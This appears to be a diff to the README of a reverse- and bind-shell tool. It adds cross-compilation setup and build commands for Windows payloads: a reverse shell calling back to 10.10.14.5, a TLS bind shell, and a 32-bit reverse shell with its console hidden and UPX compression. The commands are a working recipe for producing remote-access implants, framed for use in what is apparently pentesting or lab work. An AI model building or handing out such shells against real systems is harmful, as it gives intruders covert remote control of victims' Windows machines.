@@ -38,6 +38,33 @@ make current
 ./build.sh reverse 10.10.14.5:443 --tls --password "secret"
 ```
 
+**Cross-compile for Windows targets (from Linux):**
+
+One-time setup:
+
+```bash
+rustup target add x86_64-pc-windows-gnu          # 64-bit
+rustup target add i686-pc-windows-gnu            # 32-bit (optional)
+sudo apt install mingw-w64                       # Debian/Ubuntu/Kali
+# or: sudo dnf install mingw64-gcc mingw32-gcc   # Fedora
+```
+
+Build:
+
+```bash
+# Windows x64 reverse shell
+./build.sh reverse 10.10.14.5:4444 --target x86_64-pc-windows-gnu
+
+# Windows x64 bind shell with TLS
+./build.sh listen 4444 --target x86_64-pc-windows-gnu --tls
+
+# Windows x86 reverse shell, NOCLI + UPX-compressed
+./build.sh reverse 10.10.14.5:443 \
+    --target i686-pc-windows-gnu --nocli --compress
+```
+
+The output binary is written to `bin/neap_<host>_<port>.exe`.
+
 **Verify:**
 
 ```bash
